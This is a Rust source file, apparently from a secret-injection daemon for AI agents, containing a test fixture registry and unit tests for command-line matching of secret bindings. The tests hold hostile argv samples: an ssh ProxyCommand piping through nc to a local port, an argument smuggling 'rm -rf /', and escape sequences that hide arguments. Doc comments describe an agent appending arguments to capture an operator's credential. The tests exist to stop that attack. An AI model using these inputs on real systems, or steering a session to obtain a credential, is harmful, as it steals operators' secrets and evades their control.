            "binding_name": resolved.binding_name,
            "provider": resolved.provider,
            "session_id": session_id,
            "use_count": resolved.use_count,
        }),
    );
}

/// The provider call, and the one seam a test injects a fixture at.
///
/// In every build that is not a test this is exactly
/// `resolve(binding, limits, append_newline)` — the binding's own
/// `reference`, and nothing else, reaching the subprocess boundary. That
/// is the obligation `provider.rs`'s doc on `resolve` hands to this task,
/// discharged at the only line in this module that can start a process.
fn run_provider(
    binding: &SecretBinding,
    limits: &SecurityConfig,
    append_newline: bool,
) -> Result<SecretBytes, ProviderError> {
    // REQ-TST-007 / Global Constraint 12: `secret-tool`, `security`,
    // `pass` and `op` are tools this project neither pins nor installs,
    // and none is present on a CI runner — so a behavioural row drives a
    // script the test itself wrote. The override is keyed by **binding
    // name**, is reached only by a binding that has already been selected
    // and budgeted, and is compiled out of every non-test build; it can
    // therefore not weaken any claim above it about *which* bindings run
    // a provider.
    #[cfg(test)]
    if let Some(path) = fixture::script_for(&binding.name) {
        return super::provider::resolve_with(
            &super::provider::ScriptProvider::new(&binding.provider, path),
            &binding.reference,
            limits,
            append_newline,
        );
    }
    resolve(binding, limits, append_newline)
}

/// The `#[cfg(test)]` fixture registry — see [`run_provider`].
#[cfg(test)]
pub(crate) mod fixture {
    use std::collections::HashMap;
    use std::path::{Path, PathBuf};
    use std::sync::OnceLock;

    use parking_lot::Mutex;

    /// Keyed by **binding name**, and every row uses a unique one.
    ///
    /// libtest runs a target's rows on threads of one process, so this map
    /// is shared by every row that is running at the same moment. Keying
    /// by binding name rather than by provider spelling is what keeps them
    /// out of each other's way: two rows can both drive a `pass` binding
    /// as long as the bindings are not called the same thing.
    fn scripts() -> &'static Mutex<HashMap<String, PathBuf>> {
        static SCRIPTS: OnceLock<Mutex<HashMap<String, PathBuf>>> = OnceLock::new();
        SCRIPTS.get_or_init(|| Mutex::new(HashMap::new()))
    }

    pub(crate) fn install(binding_name: &str, path: &Path) {
        scripts()
            .lock()
            .insert(binding_name.to_string(), path.to_path_buf());
    }

    pub(crate) fn remove(binding_name: &str) {
        scripts().lock().remove(binding_name);
    }

    pub(crate) fn script_for(binding_name: &str) -> Option<PathBuf> {
        scripts().lock().get(binding_name).cloned()
    }
}

/// Every binding's use count for one session, for a snapshot getter.
///
/// Shaped after `Session::redaction_stats` — a `BTreeMap` behind the
/// session's own lock, with one private increment site — because it is the
/// same kind of thing: a per-session tally with a read-only public view.
pub type BindingUses = BTreeMap<String, u32>;

#[cfg(test)]
mod tests {
    use super::*;

    use std::path::{Path, PathBuf};
    use std::sync::Arc;
    use std::time::Duration;

    use rmcp::handler::server::wrapper::Parameters;
    use rmcp::model::CallToolResult;
    use serde_json::Value;

    use crate::attach::frames::{ApprovalDecision, AttachMode, AttachRole, ServerFrame};
    use crate::attach::hub::AttachConn;
    use crate::clock::Clock;
    use crate::config::{Config, DaemonConfig};
    use crate::mcp::tools::RequestSecretInputArgs;
    use crate::mcp::HoldfastServer;
    use crate::protocol::handshake::ClientKind;
    use crate::pty::{InProcessPty, PtyBackend, PtySpawnConfig, Signal};
    use crate::session::{new_session_id, Session, SessionConfig};

    // ------------------------------------------------------- fixtures
    //
    // **These rows are in the library target and not in
    // `tests/secrets.rs`, and that is forced rather than preferred.**
    // Every behavioural claim below needs a provider that *runs* — "the
    // child received the resolved value", "no provider process was
    // spawned", "the first binding's provider ran and the second's did
    // not" — and the only provider a test may run is a script the test
    // itself wrote (REQ-TST-007 / Global Constraint 12). The type that
    // does that is `ScriptProvider`, which is `#[cfg(test)]` since Task
    // 9's review finding I-2, and `#[cfg(test)]` is invisible from an
    // integration target. `tests/secrets.rs` keeps the rows that execute
    // nothing.

    /// A value that matches **no** built-in redaction rule, so an absence
    /// assertion over it cannot pass because a redactor got there first.
    const PROBE: &str = "hunter2";

    /// A reference shaped like a real one and, like [`PROBE`], invisible
    /// to every built-in rule — asserted in
    /// `binding_resolved_records_the_name_and_never_the_reference`, which
    /// would otherwise be satisfied by the redactor rather than by this
    /// module.
    const REFERENCE: &str = "op://vault/prod-db-refcanary/password";

    /// The `match_command` almost every row below carries, for a session
    /// recorded as `ssh prod-01` (or `prod-02`).
    ///
    /// **It was `^ssh\b` until GH #45**, which matched because matching
    /// was a prefix test. Under the whole-line rule that pattern selects
    /// only a session whose entire command line is the four bytes `ssh`,
    /// so every row that used it went red at once — which is the fixture
    /// churn the fix was expected to cause and the reason this is one
    /// constant rather than forty-odd literals.
    ///
    /// **`$` and not `.*`.** Appending a permissive tail is the exact
    /// workaround `Config::validate` now refuses in an operator's config,
    /// and reaching for it here to make a suite green would be this
    /// project's own tests modelling the defect.
    const SSH_PROD: &str = "^ssh\\s+prod-0[12]$";

    /// The one echo-off fixture (Global Constraint 14), **and a row below
    /// that asserts this copy is the same one**.
    ///
    /// GC14's requirement is one *spelling* everywhere, and the spelling
    /// this repo uses lives in `tests/secrets.rs`. Three targets cannot
    /// share a constant — `secret::provider`'s test module carries the
    /// second copy — so each copy is pinned to the original by comparing
    /// source text, which is the `tests/source_guards.rs` idiom for a
    /// guarantee that is invisible from inside the program. See
    /// `the_echo_off_fixture_here_is_the_one_in_the_integration_suite_too`.
    ///
    /// Not `read -s`: rev. 36's classification has an **ICANON** rung, and
    /// `sh` is `dash` on most CI images, where `read -s` neither exists nor
    /// fails loudly. It prints its prompt because the `AwaitingSecret` edge
    /// is computed per read chunk, and it prints a *transform* of what it
    /// read so arrival is assertable without the value ever being printed.
    const ECHO_OFF_FIXTURE: &str = "stty -echo; printf 'Password: '; read x; stty echo; \
     printf 'got=%s\\n' \"$(printf %s \"$x\" | tr a-z A-Z)\"";

    /// The same fixture with a different prompt, built by **replacing**
    /// rather than by writing a second one — GC14 again: one spelling, and
    /// a variant that re-typed the `stty`/`read` shape would be a second.
    fn echo_off_prompting(prompt: &str) -> String {
        let out = ECHO_OFF_FIXTURE.replace("Password: ", prompt);
        assert_ne!(out, ECHO_OFF_FIXTURE, "the prompt substitution missed");
        out
    }

    fn contains(haystack: &[u8], needle: &[u8]) -> bool {
        haystack.windows(needle.len()).any(|w| w == needle)
    }

    /// A scratch directory that removes itself **on unwind as well as on
    /// success**. Task 9 measured the alternative: with the removal
    /// written as a statement at the end of a row, every injected mutation
    /// that reddened it left a `/tmp/holdfast-*` behind, against a plan
    /// whose Global Constraint 11 sweeps exactly that pattern.
    ///
    /// It also owns the fixture registrations, so a row that panics does
    /// not leave a provider override installed for whatever runs next.
    ///
    /// **Every binding it mints carries a name unique to the row**, and
    /// that is not tidiness: libtest runs this target's rows on threads of
    /// one process, [`fixture`]'s registry is keyed by binding name, and
    /// two rows both calling their binding `prod-ssh` overwrite each
    /// other's script and each other's marker. Measured, on the first run
    /// of this file: six rows failed, three because their provider never
    /// ran and three because a provider ran that should not have — the
    /// same fault seen from both sides.
    struct Scratch {
        dir: PathBuf,
        unique: String,
        minted: Vec<String>,
    }

    impl Scratch {
        fn new(tag: &str) -> Self {
            let unique = uuid::Uuid::new_v4().simple().to_string()[..8].to_string();
            let dir = PathBuf::from(format!("/tmp/holdfast-binding-{tag}-{unique}"));
            std::fs::create_dir_all(&dir).expect("create the fixture directory");
            Self {
                dir,
                unique,
                minted: Vec::new(),
            }
        }

        fn path(&self, name: &str) -> PathBuf {
            self.dir.join(name)
        }

        /// This row's name for the binding it calls `short`.
        fn name(&self, short: &str) -> String {
            format!("{short}-{}", self.unique)
        }

        /// A binding whose provider is a script **this row wrote**
        /// (REQ-TST-007), matching `match_command` and nothing else.
        ///
        /// The script's first act is to record that it ran, so "no
        /// provider process was spawned" is asserted on the filesystem
        /// rather than on our not having asked for one.
        fn binding(&mut self, short: &str, match_command: &str, body: &str) -> SecretBinding {
            let name = self.name(short);
            let path = self.path(&format!("{short}.sh"));
            let marker = self.marker(short);
            // See `secret::provider::exec_guard`. This task roughly tripled
            // the number of rows in this one test binary that write an
            // executable and then spawn it, and the rows it broke were
            // **Task 9's**, not these: an `ETXTBSY` lands on whoever execs,
            // not on whoever was writing.
            let guard = crate::secret::provider::exec_guard::writing();
            std::fs::write(
                &path,
                format!("#!/bin/sh\necho ran > '{}'\n{body}", marker.display()),
            )
            .expect("write the fixture");
            #[cfg(unix)]
            {
                use std::os::unix::fs::PermissionsExt;
                std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o700))
                    .expect("chmod the fixture");
            }
            drop(guard);
            fixture::install(&name, &path);
            self.minted.push(name.clone());
            plain_binding(&name, match_command)
        }

        fn marker(&self, short: &str) -> PathBuf {
            self.path(&format!("{short}.ran"))
        }

        /// Did this binding's provider actually run?
        fn ran(&self, short: &str) -> bool {
            self.marker(short).exists()
        }

        fn audit_log(&self) -> PathBuf {
            self.path("audit.log")
        }

        /// Every audit line for one session, parsed.
        fn audit(&self, session_id: &str) -> Vec<Value> {
            std::fs::read_to_string(self.audit_log())
                .unwrap_or_default()
                .lines()
                .filter_map(|l| serde_json::from_str::<Value>(l).ok())
                .filter(|e| e["session_id"] == session_id)
                .collect()
        }

        fn audit_text(&self) -> String {
            std::fs::read_to_string(self.audit_log()).unwrap_or_default()
        }

        fn kinds(&self, session_id: &str) -> Vec<String> {
            self.audit(session_id)
                .iter()
                .filter_map(|e| e["kind"].as_str().map(str::to_string))
                .collect()
        }
    }

    impl Drop for Scratch {
        fn drop(&mut self) {
            for name in &self.minted {
                fixture::remove(name);
            }
            let _ = std::fs::remove_dir_all(&self.dir);
        }
    }

    /// Every `match_command` this module's fixtures use, paired with a
    /// `match_example` that justifies it — and asserted to survive the
    /// real loader by
    /// [`every_fixture_pattern_is_one_an_operator_could_actually_load`].
    ///
    /// See [`plain_binding`] for why the pairing lives here rather than
    /// on the fixture.
    const LOADABLE_FIXTURE_PATTERNS: &[(&str, &str)] = &[
        (SSH_PROD, "ssh prod-01"),
        (r"^ssh\s+(\S+@)?prod-0[12]\b", "ssh prod-01"),
        (r"^psql\s+-h\s+prod$", "psql -h prod"),
        (r"^git\s+push$", "git push"),
        (r"ssh\s+prod-01", "ssh prod-01"),
        (r"ssh\s+prod-01|psql\s+-h\s+prod", "ssh prod-01"),
        (r"(?m)^ssh\s+prod-01$", "ssh prod-01"),
    ];

    /// The fixture patterns the loader **refuses**, which is the whole
    /// subject of the rows that use them.
    ///
    /// Each entry names the row it belongs to, so "this corpus could not
    /// exist in a real config" stays a deliberate, enumerated exception
    /// rather than an accident nobody noticed.
    const REFUSED_FIXTURE_PATTERNS: &[(&str, &str)] = &[
        (
            "",
            "neither_an_empty_nor_a_partial_match_command_selects_a_real_session",
        ),
        ("^ssh(", "an_uncompilable_pattern_matches_nothing"),
    ];

    /// Patterns a row **built at runtime** and proved loadable by calling
    /// [`assert_fixture_pattern_loads`].
    ///
    /// Two rows here build their `match_command` with `format!` from the
    /// very command line they are about — a `regex::escape`d shell
    /// one-liner, and a temporary path — so there is no constant to list
    /// and no example to write down in advance. Membership cannot
    /// describe them; validation can, and it is the stronger check, so
    /// those rows get the real `Config::validate` instead of a list
    /// entry.
    ///
    /// Process-wide rather than per-row, and that is sound: nothing
    /// reaches this set without `Config::validate` having accepted it, so
    /// a pattern one row proved is a pattern any row may use.
    fn validated_generated_patterns(
    ) -> &'static parking_lot::Mutex<std::collections::HashSet<String>> {
        static VALIDATED: std::sync::OnceLock<
            parking_lot::Mutex<std::collections::HashSet<String>>,
        > = std::sync::OnceLock::new();
        VALIDATED.get_or_init(|| parking_lot::Mutex::new(std::collections::HashSet::new()))
    }

    /// Put one fixture pattern in front of the **real** `Config::validate`,
    /// with the command line it is written for as its `match_example`.
    ///
    /// Built in Rust rather than as a TOML document on purpose: one of
    /// these patterns carries a literal `ESC` and a bare `CR`, which TOML
    /// string syntax cannot round-trip, and a check that could not
    /// express the corpus's most hostile member would be the wrong check.
    /// `parse_str("")` supplies serde's defaults for every other key —
    /// `Config::default()` would not, since a derived `Default` gives
    /// `""` and `0` where the loader requires a named mode and a nonzero
    /// bound.
    fn assert_fixture_pattern_loads(match_command: &str, match_example: &str) {
        let mut cfg =
            crate::config::parse_str("").expect("the empty document is the shipped default");
        cfg.security.secret_provider = "keychain".to_string();
        cfg.security.secret_bindings = vec![SecretBinding {
            name: "corpus".to_string(),
            match_command: match_command.to_string(),
            match_example: match_example.to_string(),
            match_prompt: String::new(),
            provider: "pass".to_string(),
            reference: REFERENCE.to_string(),
            max_uses: None,
            require_confirm: false,
        }];
        cfg.validate().unwrap_or_else(|e| {
            panic!(
                "the fixture pattern {match_command:?} is one no operator could load against \
                 the line it is written for ({match_example:?}), so every row using it is \
                 about a config that cannot exist: {e}"
            )
        });
        validated_generated_patterns()
            .lock()
            .insert(match_command.to_string());
    }

    /// A binding with everything defaulted except what a row is about,
    /// and **no provider fixture** — for the rows that match without
    /// resolving.
    ///
    /// **The pattern is checked against the loader's corpus (GH #45
    /// M-7).** These rows build a `SecurityConfig` in Rust, so nothing
    /// otherwise makes a fixture pattern one an operator could actually
    /// load — and since GH #45 round 3 the loader refuses whole classes
    /// of pattern that a Rust literal still constructs happily. A test
    /// corpus that could not exist in a real config is a corpus proving
    /// things about a daemon nobody can run.
    ///
    /// The check is *membership*, not validation, and that is deliberate:
    /// `Config::validate` judges `match_command` against a
    /// `match_example`, which a fixture does not have and must not grow
    /// one for (see the `match_example` note below). So the example that
    /// justifies each pattern lives in
    /// [`LOADABLE_FIXTURE_PATTERNS`], the deliberate exceptions live in
    /// [`REFUSED_FIXTURE_PATTERNS`] beside the row that owns them, and
    /// [`every_fixture_pattern_is_one_an_operator_could_actually_load`]
    /// drives both lists through `Config::validate`. A new fixture
    /// pattern in neither list fails **here**, at the row that introduced
    /// it — and a pattern a row builds at runtime clears this by having
    /// been validated directly, via
    /// [`assert_fixture_pattern_loads`].
    fn plain_binding(name: &str, match_command: &str) -> SecretBinding {
        assert!(
            LOADABLE_FIXTURE_PATTERNS
                .iter()
                .any(|(p, _)| *p == match_command)
                || REFUSED_FIXTURE_PATTERNS
                    .iter()
                    .any(|(p, _)| *p == match_command)
                || validated_generated_patterns()
                    .lock()
                    .contains(match_command),
            "the fixture pattern {match_command:?} is not accounted for, so nothing says \
             whether an operator could load it. Add it to `LOADABLE_FIXTURE_PATTERNS` with \
             the `match_example` that justifies it; or, if the row's subject *is* that the \
             loader refuses it, to `REFUSED_FIXTURE_PATTERNS` naming the row; or, if the \
             row builds it at runtime, call `assert_fixture_pattern_loads` with the \
             command line it is built for."
        );
        SecretBinding {
            name: name.to_string(),
            match_command: match_command.to_string(),
            // **Deliberately empty in this module's rows.**
            // `match_example` is a *load-time* input: `Config::validate`
            // is the only thing that reads it, and these rows build a
            // `SecurityConfig` in Rust without going through the loader.
            // Filling it in here would suggest the matcher consults it,
            // which it does not and must not — the matcher's subject is
            // the session's command line and nothing else.
            match_example: String::new(),
            match_prompt: String::new(),
            provider: "pass".to_string(),
            reference: REFERENCE.to_string(),
            max_uses: None,
            require_confirm: false,
        }
    }

    /// `[security]` in the mode that lets step 1 run at all.
    fn keychain_mode(bindings: Vec<SecretBinding>) -> SecurityConfig {
        SecurityConfig {
            secret_provider: "keychain".to_string(),
            secret_bindings: bindings,
            // Bounded well under the row ceilings below, so a fixture that
            // hangs is a red row rather than a hung job.
            keychain_provider_timeout_secs: 5,
            ..SecurityConfig::default()
        }
    }

    fn server_with(security: SecurityConfig, audit_log: &Path) -> HoldfastServer {
        server_full(
            security,
            audit_log,
            DaemonConfig::default().binding_approval_timeout_secs,
            Clock::system(),
        )
    }

    /// [`server_with`] plus the two knobs §17.5's rows need: the approval
    /// window, and a clock a test can move.
    ///
    /// **The clock has to reach the server and not just the test**, or
    /// `run_binding_approval`'s `sleep_until` is on wall time and an
    /// `advance` moves nothing — which is the failure `Clock` exists to
    /// prevent, and which would show up here as a row that waits out a
    /// real 120 seconds.
    fn server_full(
        security: SecurityConfig,
        audit_log: &Path,
        binding_approval_timeout_secs: u64,
        clock: Clock,
    ) -> HoldfastServer {
        let config = Config {
            security,
            daemon: DaemonConfig {
                binding_approval_timeout_secs,
                ..DaemonConfig::default()
            },
            ..Config::default()
        };
        let server = HoldfastServer::with_audit_path_config_and_clock(
            Some(audit_log.to_path_buf()),
            &config,
            clock,
        );
        // **The control that makes every audit assertion below mean
        // something.** A `HoldfastServer` built with `None` — or with a
        // path it could not open — carries a *disabled* log, against which
        // "no `binding_resolved` line" is true of every implementation
        // there could be. That is a shape this plan has already been burnt
        // by (Global Constraint 3).
        assert!(
            server.audit_open_error.is_none(),
            "the audit trail did not open: {:?}",
            server.audit_open_error
        );
        assert!(
            server.processor.audit.path().is_some(),
            "the audit trail is disabled, so every absence assertion here is vacuous"
        );
        server
    }

    /// A session on a real PTY whose **recorded** command line is
    /// `command`/`args` and whose child is `script`.
    ///
    /// The two are independent on purpose and that is not a cheat: §9.4
    /// records what `start_session` was called with, `match_command`
    /// matches that, and no test may run a real `ssh`. The child is
    /// whatever the row needs to observe.
    fn session_running(command: &str, args: &[&str], script: &str) -> Arc<Session> {
        let mut cfg = PtySpawnConfig::new("sh");
        cfg.args = vec!["-c".to_string(), script.to_string()];
        // **This is a `fork` too**, and `exec_guard` is about forks, not
        // about providers: a PTY child that inherits a write fd to some
        // other row's fixture holds it until its own `exec`, and the row
        // that then runs that fixture gets the `ETXTBSY`. Measured — with
        // only the provider spawn guarded the rate fell but did not reach
        // zero, and the rows still failing were the ones that build a PTY.
        let pty = {
            let _no_writer_is_open = crate::secret::provider::exec_guard::spawning();
            InProcessPty::spawn(&cfg).expect("spawn a real shell")
        };
        Session::new(
            new_session_id(),
            None,
            command.to_string(),
            args.iter().map(|a| a.to_string()).collect(),
            Arc::new(pty) as Arc<dyn PtyBackend>,
            SessionConfig::with_buffer_capacity(256 * 1024),
        )
    }

    fn buffered(s: &Session) -> Vec<u8> {
        s.buffer_slice(s.buffer_tail(), s.buffer_head())
    }

    /// Poll the ring buffer until `needle` shows up, or fail.
    async fn buffer_until(s: &Session, needle: &[u8], secs: u64) -> Vec<u8> {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(secs);
        loop {
            let buf = buffered(s);
            if contains(&buf, needle) {
                return buf;
            }
            assert!(
                tokio::time::Instant::now() < deadline,
                "{:?} never reached the buffer:\n{}",
                String::from_utf8_lossy(needle),
                String::from_utf8_lossy(&buf)
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// Wait until the child has dropped `ECHO`, observed through the
    /// prompt it prints *after* `stty -echo`. Resolving before that point
    /// would have the line discipline echo the value straight back into
    /// the ring buffer, failing the leak assertions for a reason that has
    /// nothing to do with a binding.
    async fn await_prompt(s: &Session, prompt: &[u8]) {
        buffer_until(s, prompt, 20).await;
    }

    /// Wait until the **detector** has the prompt line, not merely the
    /// ring buffer, and hand it back.
    ///
    /// The two are fed on the same reader path and not in the same
    /// instant: measured under a loaded workspace run,
    /// [`buffer_until`] returned with the prompt in the ring while
    /// `detection().last_line` was still `""`. Only the row whose subject
    /// is `match_prompt` needs this — every other row here carries an
    /// empty pattern and never reads the line — but that row would
    /// otherwise be a flake that looks exactly like the bug it is written
    /// to catch.
    async fn await_detected_prompt(s: &Session, needle: &str) -> String {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        loop {
            let line = s.detection().last_line;
            if line.contains(needle) {
                return line;
            }
            assert!(
                tokio::time::Instant::now() < deadline,
                "the detector never saw {needle:?}; its line is {line:?}"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// Poll until this binding's provider has actually started.
    ///
    /// `Scratch::binding` makes the marker the script's **first** act, so
    /// this returns while a gated fixture is still blocked — which is what
    /// lets a row act inside the provider's window deterministically
    /// instead of racing it.
    async fn await_ran(sc: &Scratch, short: &str) {
        let deadline = tokio::time::Instant::now() + Duration::from_secs(20);
        while !sc.ran(short) {
            assert!(
                tokio::time::Instant::now() < deadline,
                "the provider for `{short}` never started"
            );
            tokio::time::sleep(Duration::from_millis(20)).await;
        }
    }

    /// Put a value on the write queue exactly as `attach::conn`'s
    /// `SecretInput` arm does, which is what a human at an attached client
    /// is — §5.2's normalisation applied by the daemon, and the value in
    /// the one type whose `Drop` zeroes it.
    async fn write_as_a_human(s: &Session, bytes: &[u8]) {
        let (req, ack) =
            crate::session::WriteRequest::secret(SecretBytes::normalise(bytes.to_vec(), true));
        s.write_queue()
            .send(req)
            .await
            .expect("the write queue accepted");
        ack.await
            .expect("the writer answered")
            .expect("the PTY took the write");
    }

    /// The ordinary call these rows make.
    ///
    /// `timeout_secs` is short because on every fall-through row the call
    /// *is* the prompt path, with no client attached and nobody to answer
    /// it — so the row's cost is its deadline.
    fn secret_args(session: &str, timeout_secs: u32) -> RequestSecretInputArgs {
        RequestSecretInputArgs {
            session: session.to_string(),
            prompt_text: "a credential".into(),
            timeout_secs: Some(timeout_secs),
            ..Default::default()
        }
    }

    async fn call(server: &HoldfastServer, args: RequestSecretInputArgs) -> Value {
        let r = tokio::time::timeout(
            Duration::from_secs(60),
            server.request_secret_input(Parameters(args)),
        )
        .await
        .expect("request_secret_input never returned")
        .expect("request_secret_input");
        body(&r)
    }

    fn body(r: &CallToolResult) -> Value {
        r.structured_content.clone().expect("structured content")
    }

    /// The two assertions every fall-through row makes, together: the call
    /// really did take the **prompt** path, and it really did not take the
    /// keychain one.
    fn fell_through_to_the_prompt(payload: &Value, sc: &Scratch, session_id: &str) {
        assert_eq!(
            payload["status"], "secret_cancelled",
            "the call did not fall through to the prompt path: {payload}"
        );
        assert_eq!(
            payload["data"]["reason"], "timeout",
            "the prompt path ran but ended some other way: {payload}"
        );
        let kinds = sc.kinds(session_id);
        assert!(
            kinds.iter().any(|k| k == "secret_input_request"),
            "no `secret_input_request` was written, so the prompt path did not run at \
             all: {kinds:?}"
        );
        assert!(
            !kinds.iter().any(|k| k == "binding_resolved"),
            "a binding resolved on a row whose whole claim is that none did: {kinds:?}"
        );
    }

    // ------------------------------------------------- the join, alone

    /// The join `match_command` is applied to, pinned on its own.
    ///
    /// Separately from the rows below because it is the one part of this
    /// module whose *justification* the plan got wrong: there is no joined
    /// command line anywhere else in the tree to lift a regex from. See
    /// the module header.
    #[test]
    fn the_command_line_is_command_and_args_joined_with_single_spaces() {
        assert_eq!(
            command_line("ssh", &["user@prod-01".to_string()]),
            "ssh user@prod-01"
        );
        assert_eq!(command_line("bash", &[]), "bash", "no trailing space");
        // Not shell-quoted, and the documented consequence: an argument
        // with a space in it straddles a word boundary.
        assert_eq!(
            command_line("psql", &["-c".to_string(), "select 1".to_string()],),
            "psql -c select 1"
        );
        // The negative that separates this from `args.join(" ")` with the
        // command dropped, and from a join that quotes.
        assert!(!command_line("ssh", &["a".into()]).starts_with(' '));
        assert!(!command_line("ssh", &["a b".into()]).contains('"'));
    }

    /// **The human-facing rendering cannot be made to lose an argument**,
    /// and the per-element application is what stops one argument
    /// reaching into the next.
    ///
    /// Both halves are GH #45's re-review. The first is N-3: an earlier
    /// revision built this through `ansi::strip`, which *consumes*
    /// OSC/DCS/APC payloads, so `ssh prod-01\x1b]0; -o ProxyCommand=…\x07`
    /// rendered as exactly `ssh prod-01` — a forged **short** line, which
    /// is layer D inverted. The second is the good news the re-review
    /// found and had no row for: because `redacted_command_line` renders
    /// **element-wise**, an unterminated sequence in one argument cannot
    /// swallow the one after it. A single pass over the joined string
    /// would let it.
    #[test]
    fn an_unterminated_escape_in_one_argument_does_not_reach_the_next() {
        let rules = crate::output::rules::RuleSet::builtin().expect("the built-in rules");
        let show = |args: &[&str]| {
            redacted_command_line(
                &rules,
                "ssh",
                &args.iter().map(|a| a.to_string()).collect::<Vec<_>>(),
            )
        };

        // N-3's four subjects, on the real field. Each argument's text
        // must survive; only its power to act is removed.
        for opener in ["\u{1b}]0;", "\u{1b}_", "\u{1b}P"] {
            let shown = show(&[
                "prod-01",
                &format!("{opener} -o ProxyCommand=nc 1.2.3.4 22"),
            ]);
            assert!(
                shown.contains("-o ProxyCommand=nc 1.2.3.4 22"),
                "an argument was consumed rather than de-fanged, so the operator is \
                 shown a command line with a piece missing: {shown:?}"
            );
            assert!(!shown.chars().any(char::is_control), "{shown:?}");
        }

        // **The boundary.** The unterminated OSC is in argument two; the
        // `-o` in argument three must still be there. Rendering the join
        // in one pass would eat it.
        let shown = show(&["prod-01", "\u{1b}]0;label", "-o", "ProxyCommand=nc 1 2"]);
        assert_eq!(
            shown, "ssh prod-01 ]0;label -o ProxyCommand=nc 1 2",
            "an unterminated sequence in one argument reached into the next"
        );

        // The pairing: ordinary arguments render unchanged, so the rows
        // above are not satisfied by a function that returns its input.
        assert_eq!(
            show(&["user@prod-01", "-o", "StrictHostKeyChecking=no"]),
            "ssh user@prod-01 -o StrictHostKeyChecking=no"
        );
    }

    /// The mode gate, both ways, before any row relies on it.
    #[test]
    fn only_keychain_and_both_let_step_one_run() {
        assert!(keychain_step_runs("keychain"));
        assert!(keychain_step_runs("both"));
        assert!(
            !keychain_step_runs("prompt"),
            "`prompt` is the default, and the default install must not read a \
             credential store"
        );
        // Not a fallback-to-on: an unknown spelling (which `Config::validate`
        // refuses at load) must not enable the store.
        assert!(!keychain_step_runs(""));
        assert!(!keychain_step_runs("Keychain"));
        assert!(!keychain_step_runs("kechain"));
    }

    /// The prompt-line rules, as a table, because the empty case has three
    /// readings and only one of them is right.
    #[test]
    fn an_empty_prompt_line_never_satisfies_a_match_prompt() {
        let mut with_prompt = plain_binding("p", SSH_PROD);
        with_prompt.match_prompt = "(?i)password".to_string();
        let mut anything = plain_binding("a", SSH_PROD);
        anything.match_prompt = ".*".to_string();
        let no_prompt = plain_binding("n", SSH_PROD);

        let set = [with_prompt.clone(), anything.clone(), no_prompt.clone()];
        // A binding with **no** `match_prompt` selects on the command
        // alone, empty line or not — that is §9.6's reading of the empty
        // pattern and `config.rs` says so at the validation site.
        assert_eq!(
            select(&set[2..], "ssh prod-01", "").map(|b| b.name.as_str()),
            Some("n")
        );
        // A binding **carrying** one does not select on an empty line,
        // whatever the pattern is. `.*` is the case that separates this
        // rule from "compare and let the regex decide": it would match
        // `""` and hand a credential to a session nobody has observed a
        // prompt from.
        assert_eq!(select(&set[..1], "ssh prod-01", ""), None);
        assert_eq!(
            select(&set[1..2], "ssh prod-01", ""),
            None,
            "`.*` against an empty line is a silent match-everything"
        );
        // The pairing: the same two bindings against a real line.
        assert_eq!(
            select(&set[..1], "ssh prod-01", "Password: ").map(|b| b.name.as_str()),
            Some("p")
        );
        assert_eq!(
            select(&set[1..2], "ssh prod-01", "$ ").map(|b| b.name.as_str()),
            Some("a")
        );
    }

    /// **GH #45, at the matcher.** The agent shapes a command line that
    /// satisfies §9.6's *published* pattern and redirects the client's
    /// transport to itself; it must not select the operator's binding.
    ///
    /// This is the issue's own reproduction, verbatim, and the pattern is
    /// not a straw man — it is the one §9.6 published, unchanged, at the
    /// moment the issue was filed. §9.6 now publishes `…prod-0[12]$`
    /// instead, and this row deliberately keeps the **old** spelling: the
    /// claim worth making is that the exploit is dead even for the
    /// pattern that shipped, not merely that it is dead for a pattern
    /// rewritten afterwards. Against it the agent called
    ///
    /// ```text
    /// start_session("ssh", ["prod-01",
    ///                       "-o", "StrictHostKeyChecking=no",
    ///                       "-o", "UserKnownHostsFile=/dev/null",
    ///                       "-o", "ProxyCommand=nc 127.0.0.1 2222"])
    /// ```
    ///
    /// and, before the fix, got `secret_provided`, an audit line naming
    /// the binding, and the operator's credential back out of
    /// `read_output`.
    ///
    /// **The pairing is not optional here and is the reason the two halves
    /// are one row.** An anchoring bug that matches *nothing* satisfies
    /// every hostile line in the loop below and is a worse implementation
    /// than the one being fixed — so each hostile line is asserted beside
    /// the legitimate session the same operator wrote the binding for.
    #[test]
    fn an_agent_cannot_append_arguments_to_reach_an_operators_binding() {
        // §9.6's published pattern, character for character.
        let operators = plain_binding("prod-ssh", "^ssh\\s+(\\S+@)?prod-0[12]\\b");
        let one = std::slice::from_ref(&operators);

        // The legitimate sessions. **First**, so a matcher that answers
        // `None` to everything fails here rather than passing below.
        for (command, args) in [
            ("ssh", vec!["prod-01"]),
            ("ssh", vec!["user@prod-01"]),
            ("ssh", vec!["prod-02"]),
        ] {
            let line = command_line(
                command,
                &args.iter().map(|a| a.to_string()).collect::<Vec<_>>(),
            );
            assert_eq!(
                select(one, &line, "").map(|b| b.name.as_str()),
                Some("prod-ssh"),
                "the operator's own session stopped matching: {line:?}"
            );
        }

        // The issue's argv, and the same trick in the shapes a reviewer
        // would reach for next: the payload before the flags, a `-o` that
        // is not the last word, and the `ProxyCommand=` value carrying the
        // spaces that made the un-quoted join interesting in the first
        // place.
        for args in [
            vec![
                "prod-01",
                "-o",
                "StrictHostKeyChecking=no",
                "-o",
                "UserKnownHostsFile=/dev/null",
                "-o",
                "ProxyCommand=nc 127.0.0.1 2222",
            ],
            vec!["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222"],
            vec!["prod-01", "-o", "ProxyCommand=nc 127.0.0.1 2222", "-v"],
            vec!["prod-01", "-tt", "cat"],
            // A newline in an argument. **This does not discriminate
            // `\A`/`\z` from `^`/`$`** — an earlier version of this
            // comment said it did, and it is false: in `regex` 1.13.1 `$`
            // is already end-of-text, so both spellings reject this line.
            // It is kept because a multi-line command line is a shape
            // worth having a row for at all, and `whole_line`'s doc now
            // carries the real argument for the anchor spelling.
            vec!["prod-01\nrm -rf /"],
        ] {
            let line = command_line(
                "ssh",
                &args.iter().map(|a| a.to_string()).collect::<Vec<_>>(),
            );
            assert_eq!(
                select(one, &line, ""),
                None,
                "an agent-appended tail selected the operator's binding, and the \
                 credential is typed into a client whose transport the agent chose: \
                 {line:?}"
            );
        }
    }

    /// **The `(?:…)` in `whole_line` is load-bearing, and this is the row
    /// that dies without it.**
    ///
